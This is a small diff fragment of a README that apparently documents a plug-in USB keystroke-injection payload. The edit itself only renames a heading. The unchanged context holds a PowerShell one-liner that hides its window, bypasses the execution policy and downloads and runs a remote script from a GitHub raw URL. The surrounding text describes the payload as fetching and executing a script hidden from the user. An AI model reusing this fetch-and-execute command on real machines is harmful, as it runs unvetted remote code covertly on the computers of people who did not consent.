@@ -30,7 +30,7 @@ Opens PowerShell hidden, download a Python script, execute it, remove Python scr
 
 * Plug in your device
 
-All
+Execution
 ```powershell
 powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1').Content"
 ```
